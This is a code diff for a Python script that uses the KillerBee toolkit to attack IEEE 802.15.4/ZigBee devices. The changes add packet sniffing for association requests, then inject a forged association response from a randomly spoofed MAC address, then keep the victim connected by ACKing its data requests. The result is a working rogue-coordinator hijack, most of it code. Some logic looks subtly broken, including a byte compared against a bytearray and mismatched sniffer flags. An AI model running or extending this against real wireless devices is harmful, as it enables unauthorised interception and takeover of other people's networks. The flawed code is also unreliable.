@@ -6,6 +6,7 @@ import sys
 import time
 
 from killerbee import *
+from kbutils import randmac
 
 BEACON_RESPONSE_LISTEN_TRIES = 10
 
@@ -14,7 +15,7 @@ CHANNEL_INCREMENT = 2
 
 # Beacon request packet (captured via Wireshark)
 BEACON_REQUEST_PKT_BYTES = str(bytearray([
-        0x03, 0x08, 0xb4, 0xff, 0xff, 0xff, 0xff, 0x07
+        0x03, 0x08, 0xb0, 0xff, 0xff, 0xff, 0xff, 0x07
         ]))
 
 # Jam time, in microseconds
@@ -131,6 +132,7 @@ if __name__ == '__main__':
         print('8. Listening for association request.')
         got_assoc_request = False
         kb.sniffer_on(new_channel)
+        assoc_request_pkt_bytes = None
         while not got_assoc_request:
             packet = kb.pnext()
             if packet:
@@ -139,14 +141,59 @@ if __name__ == '__main__':
                 # and 0x01 as their 17th byte
                 if (packet_bytes[0] & 0b111 == 0b011 and packet_bytes[7] == 0x07):
                     print('  Got association request.')
+                    assoc_request_pkt_bytes = bytearray(packet['bytes'])
                     got_assoc_request = True
         kb.sniffer_off()
 
         # Construct association response
-        # TODO: This is complicated
+        assoc_response_seq_num = assoc_request_pkt_bytes[2]+1
+        assoc_response_dest_mac = assoc_request_pkt_bytes[8:17]
+        assoc_response_dest_pan = assoc_request_pkt_bytes[3:5]
+        fake_mac_addr_bytes = bytearray(randmac())
+        # 1. 2 bytes of frame info and sequence number (assoc request SN + 1)
+        # 2. Destination PAN (extracted from assoc request)
+        # 3. Destination MAC address (extracted from assoc request)
+        # 4. Our mac address
+        # 5. Assoc response code, new device addr = 0x1234, assoc success
+        assoc_response_pkt_bytes = bytearray([0x23, 0xc8, assoc_response_seq_num]) + \
+                assoc_response_dest_pan + \
+                assoc_response_dest_mac + \
+                fake_mac_addr_bytes + \
+                bytearray([0x02, 0x34, 0x12, 0x00])
 
         # Send forged association response
-        #kb.inject(assoc_response_pkt_bytes)
+        print('9. Sending association response.')
+        kb.inject(assoc_response_pkt_bytes)
+
+        # ACK data requests and note when data was received
+        print('10. Maintaining connection...')
+        while True:
+            sniffer_on = False
+            while not packet:
+                if not sniffer_on:
+                    kb.sniffer_on(new_channel)
+                    sniffer_on = True
+
+                packet = kb.pnext()
+                if packet:
+                    packet_bytes = bytearray(packet['bytes'])
+                    packet_seq_num = packet_bytes[2]
+                    # Check for data requests.
+                    # 1. Command header
+                    # 2. Addressed to us
+                    # 3. Data request
+                    if packet_bytes[0:2] == bytearray([0x63, 0x88]) and \
+                            packet_bytes[5:7] == bytearray([0x00, 0x00]) and \
+                            packet_bytes[9] == bytearray([0x04]):
+                        print('  Got data request. ACKing.')
+                    # Check for data
+                    elif (packet_bytes[0] & 0b111 == 0b001):
+                        print('  Got data. ACKing.')
+
+                    kb.sniffer_off()
+                    sniffer_off = True
+
+                    kb.inject([0x02, 0x00, packet_seq_num])
 
     except KeyboardInterrupt:
         print 'Shutting down'
